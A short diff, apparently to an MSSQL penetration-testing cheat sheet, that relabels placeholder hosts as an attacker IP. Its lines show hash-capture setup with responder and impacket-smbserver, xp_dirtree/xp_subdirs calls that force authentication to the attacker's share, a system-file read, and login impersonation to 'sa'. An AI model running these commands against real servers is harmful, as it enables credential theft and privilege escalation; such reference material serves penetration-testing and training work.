@@ -385,8 +385,8 @@ SQL> EXEC DECLARE @OLE INT; DECLARE @FileID INT; EXECUTE sp_OACreate 'Scripting.
 SQL> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
 $ sudo responder -I tun0
 $ sudo impacket-smbserver share ./ -smb2support
-SQL> EXEC master..xp_dirtree '\\<IP address>\share\'
-SQL> EXEC master..xp_subdirs '\\<IP address>\share\'
+SQL> EXEC master..xp_dirtree '\\<Attacker IP address>\share\'
+SQL> EXEC master..xp_subdirs '\\<Attacker IP address>\share\'
 SQL> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE
 SQL> SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')
 SQL> USE master; EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')
